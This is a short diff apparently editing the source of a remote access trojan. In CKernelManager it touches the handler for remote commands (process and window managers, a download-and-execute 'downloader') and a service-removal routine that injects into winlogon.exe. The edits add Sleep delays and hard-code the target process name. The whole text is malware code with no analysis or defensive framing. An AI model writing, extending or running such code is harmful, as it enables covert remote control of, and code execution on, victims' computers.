@@ -83,10 +83,12 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_SYSTEM:			// 进程
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		Sleep(100);
 		break;
 	case COMMAND_WSLIST:			// 窗口
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_WindowManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		Sleep(100);
 		break;
 
 	case COMMAND_DOWN_EXEC:			// 下载者
@@ -158,7 +160,8 @@ void CKernelManager::UnInstallService()
 
 	if (m_dwServiceType != 0x120)  // owner的远程删除，不能自己停止自己删除,远程线程删除
 	{
-		InjectRemoveService(winlogon_exe, m_strServiceName);
+		//InjectRemoveService(winlogon_exe, m_strServiceName);
+		InjectRemoveService("winlogon.exe", m_strServiceName);
 	}
 	else // shared进程的服务,可以删除自己
 	{
